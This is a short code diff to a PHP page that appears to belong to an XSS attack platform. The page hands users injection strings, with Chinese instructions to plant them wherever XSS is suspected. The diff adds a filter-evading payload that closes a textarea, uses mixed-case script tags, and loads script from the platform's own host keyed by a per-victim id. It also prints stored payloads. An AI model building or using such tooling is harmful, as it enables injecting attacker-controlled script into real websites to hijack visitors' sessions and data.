@@ -96,10 +96,10 @@
             $i = 1;
             while ($row = $result->fetch_array()) {
         ?>
-            <div>注入如下代码：</div>
-            <pre class="well well-large"><?php echo $xss_host."/?id=".$row['guid']; ?></pre>
+            <div>将如下代码植入怀疑出现xss的地方（注意'的转义）：</div>
+            <pre class="well well-large">&lt;/tExtArEa&gt;&#039;&quot;&gt;&lt;sCRiPt sRC=<?php echo $xss_host."/?id=".$row['guid']; ?>&gt;&lt;/sCrIpT&gt;</pre>
             <div>如果管理员配置了rewrite，也可以如下使用：</div>
-            <pre class="well well-large"><?php echo $xss_host."/".$row['guid']; ?></pre>
+            <pre class="well well-large">&lt;/tExtArEa&gt;&#039;&quot;&gt;&lt;sCRiPt sRC=<?php echo $xss_host."/".$row['guid']; ?>&gt;&lt;/sCrIpT&gt;</pre>
             <div>Payload:</div>
             <pre class="well well-large"><?php echo $row['payload']; ?></pre>
         <?php
